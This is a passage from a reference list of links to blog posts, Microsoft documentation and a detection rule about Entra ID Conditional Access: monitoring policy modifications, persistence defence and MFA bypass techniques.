4. [HybridBrothers - Detect Suspicious Conditional Access Modifications](https://hybridbrothers.com/suspicious-conditional-access-modifications/)
5. [Katie Knowles - Persisting Unseen: Defending Against Entra ID Persistence](https://kknowl.es/posts/defending-against-entra-id-persistence/)
6. [Mantra - How Hackers Bypass Azure AD Conditional Access](https://www.mantra.ms/blog/how-hackers-bypass-microsoft-azure-ad-conditional-access)
7. [Pentest Partners - Bypassing MFA on Microsoft Azure Entra ID](https://www.pentestpartners.com/security-blog/bypassing-mfa-on-microsoft-azure-entra-id/)
8. [Microsoft Learn - Conditional Access Policy Exclusion Management](https://learn.microsoft.com/en-us/entra/id-governance/conditional-access-exclusion)
9. [O365Reports - Disable MFA for Single User Using CA Policy](https://o365reports.com/disable-mfa-for-a-single-user-using-conditional-access-policy-in-azure-ad/)
10. [Detection.fyi - Entra ID Conditional Access Policy Modified](https://detection.fyi/elastic/detection-rules/integrations/azure/persistence_entra_id_conditional_access_policy_modified/)

---